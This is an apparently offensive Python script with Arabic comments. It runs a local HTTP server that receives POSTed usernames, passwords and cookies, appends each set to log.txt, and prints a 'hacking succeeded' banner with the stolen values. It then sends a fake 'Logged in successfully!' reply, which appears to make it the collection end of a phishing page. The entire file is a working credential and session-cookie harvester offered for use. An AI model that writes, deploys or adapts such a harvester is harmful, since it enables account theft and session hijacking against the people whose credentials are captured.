from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

class MazenHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        params = urllib.parse.parse_qs(post_data)

        # استخراج البيانات
        user = params.get('username', [''])[0]
        pw = params.get('password', [''])[0]
        cookie = params.get('cookie', ['لا يوجد كوكي حالياً'])[0]

        # حفظ في ملف السجل
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(f"User: {user} | Pass: {pw} | Cookie: {cookie}\n")

        # رسالة النجاح المبهرة
        print("\n\033[1;32m[+] ===========================================")
        print("[+]           تم النجاح بالاختراق!             ")
        print(f"[+] اليوزر: {user}")
        print(f"[+] الباسورد: {pw}")
        print(f"[+] الكوكي المستخرج: {cookie}")
        print("[+] ===========================================\033[0m\n")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Logged in successfully!")

    def log_message(self, format, *args):
        return # لإيقاف رسائل السيرفر المزعجة وترك الشاشة لرسائل النجاح فقط

print("سيرفر مازن يعمل الآن على المنفذ 8080...")
HTTPServer(('localhost', 8080), MazenHandler).serve_forever()
